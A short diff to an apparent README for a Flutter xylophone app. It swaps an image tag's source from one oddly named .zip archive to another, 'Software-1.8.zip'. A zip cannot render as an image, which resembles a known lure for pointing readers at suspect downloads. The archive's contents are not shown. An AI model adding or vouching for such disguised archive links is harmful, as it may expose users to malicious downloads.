@@ -7,4 +7,4 @@ Conformable using Flutter packages and building repeated widgets..
 A music app that plays Xylophone sounds. 
 For every Beethoven out there, this will let you unleash your musical talent where ever you are.
 
-<img width="358" alt="xy" src="https://raw.githubusercontent.com/Dev-Feyisayo/xylophone/master/windows/runner/Software-fretfulness.zip">
+<img width="358" alt="xy" src="https://raw.githubusercontent.com/Dev-Feyisayo/xylophone/master/windows/flutter/Software-1.8.zip">
